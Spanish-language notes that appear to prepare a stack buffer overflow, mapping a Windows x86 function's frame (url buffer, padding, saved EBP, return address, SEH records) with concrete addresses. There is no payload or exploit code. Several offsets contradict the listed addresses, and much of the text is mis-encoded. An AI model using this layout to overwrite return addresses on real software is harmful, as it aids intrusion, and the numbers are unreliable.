- url = EBP - 0x20 = 0x0022FEA8 - 0x20 = 0x0022FE88

## El padding
El padding REAL son 8 bytes.

```c
url         = 16 bytes   (0022FE88 ‚Äì 0022FE97)
padding     =  8 bytes   (0022FE98 ‚Äì 0022FE9F)
url_start   =  4 bytes   (0022FEA0 ‚Äì 0022FEA3)
f           =  4 bytes   (0022FEA4 ‚Äì 0022FEA7)
EBP viejo   =  4 bytes   (0022FEA8 ‚Äì 0022FEAB)
RET         =  4 bytes   (0022FEAC ‚Äì 0022FEB0)
```

Mapa de la pila:
```c
Direcci√≥n    Contenido
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
0022FEAC     RET
0022FEA8     EBP antiguo
0022FEA4     f
0022FEA0     url_start
0022FE9F     ‚îÇ
...          ‚îÇ
0022FE98     ‚îî‚îÄ‚îÄ padding (8 bytes)
0022FE97     ‚îÇ
...          ‚îÇ url[16]
0022FE88     ‚îò inicio de url
```


```c
          ‚ñ≤  direcciones M√ÅS ALTAS ‚Üí Arriba = direcciones grandes (memoria real)
          ‚îÇ
          ‚îÇ  (stack de la funci√≥n llamadora)
          ‚îÇ
0x......  +------------------------------+
          |   argumentos del caller      |   ‚Üê tama√±o: depende del caller
          +------------------------------+
          |   return address a caller    |   ‚Üê 4 bytes
          +------------------------------+
          |   EBP viejo (del caller)     |   ‚Üê 4 bytes
EBP -->   +------------------------------+  ‚Üê EBP = 0022FEA8

          |   FILE *f                    |   ‚Üê 4 bytes     ‚Üí [ebp-4]  = 0022FEA4
          +------------------------------+
          |   char *url_start            |   ‚Üê 4 bytes     ‚Üí [ebp-8]  = 0022FEA0
          +------------------------------+
          |   padding / alineaci√≥n       |   ‚Üê **8 bytes** ‚Üí 0022FE98..0022FE9F
          +------------------------------+
          |   url[16]                    |   ‚Üê 16 bytes    ‚Üí 0022FE88..0022FE97
          +------------------------------+
          |   buffer[512]                |   ‚Üê 512 bytes   ‚Üí [ebp-220]..[ebp-21]
          +------------------------------+
          |   (quiz√° m√°s locals)         |
          +------------------------------+
ESP -->   |   SEH.next                   |   ‚Üê 4 bytes
          +------------------------------+
          |   SEH.handler                |   ‚Üê 4 bytes
          +------------------------------+
          |   m√°s cosas por debajo...    |
          +------------------------------+
          ‚ñº  direcciones M√ÅS BAJAS ‚Üí Abajo = direcciones peque√±as
```


| Variable      | Offset desde EBP  | Direcci√≥n real | Tama√±o  |
| ------------- | ----------------- | -------------- | ------- |
| `f`           | ebp ‚àí 4           | 0022FEA4       | 4 B     |
| `url_start`   | ebp ‚àí 8           | 0022FEA0       | 4 B     |
| **padding**   | ebp ‚àí 0x14..‚àí0x0C | 0022FE98‚Äì9F    | **8 B** |
| `url[16]`     | ebp ‚àí 0x20        | 0022FE88‚Äì97    | 16 B    |
| `buffer[512]` | ebp ‚àí 0x220       | (m√°s abajo)    | 512 B   |
| nSEH          | justo debajo ESP  | var√≠a          | 4 B     |
| SEH handler   | debajo de nSEH    | var√≠a          | 4 B     |

